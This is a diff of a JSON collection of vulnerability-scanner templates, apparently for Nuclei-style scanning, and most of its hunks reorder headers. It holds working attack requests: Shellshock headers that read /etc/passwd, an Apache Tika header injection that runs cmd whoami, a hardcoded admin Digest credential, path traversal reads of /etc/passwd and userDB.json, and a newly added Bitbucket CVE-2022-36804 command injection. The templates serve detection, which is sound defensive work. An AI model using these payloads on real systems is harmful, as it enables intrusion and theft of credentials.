@@ -3391,9 +3391,9 @@
       "requests": [
         {
           "headers": {
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -6679,11 +6679,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
             "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript"
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -16855,8 +16855,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
@@ -21435,6 +21435,21 @@
           "path": [
             "{{BaseURL}}/logs/downloadMainLog?fname=../../../../../../..//etc/passwd",
             "{{BaseURL}}/logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-36804",
+      "info": {
+        "name": "Atlassian Bitbucket Command Injection Vulnerability",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /rest/api/latest/repos HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /rest/api/latest/projects/{{key}}/repos/{{slug}}/archive?filename={{data}}&at={{data}}&path={{data}}&prefix=ax%00--exec=%60id%60%00--remote=origin HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
